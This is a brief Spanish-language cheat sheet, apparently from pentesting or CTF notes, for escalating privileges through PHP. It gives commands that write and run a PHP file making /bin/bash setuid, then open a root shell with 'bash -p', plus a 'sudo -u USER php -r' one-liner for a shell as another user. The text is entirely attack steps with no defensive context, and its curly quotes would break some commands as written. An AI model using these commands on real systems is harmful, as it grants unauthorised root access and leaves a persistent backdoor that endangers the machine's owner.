## Sin nano habilitado

```bash
echo ‘<?php system(”chmod u+s /bin/bash”); ?>’ > /ruta_archivo.php
```

## Con nano habilitado

Crear un archivo .php

```bash
<?php

shell_exec('chmod u+s /bin/bash');        
 
?>
```

y ejecutarlo como sudo php archivo.php

```bash
bash -p
```

## Bash:

```bash
CMD=”/bin/bash”

sudo -u USER php -r “system(’$CMD’);”
```
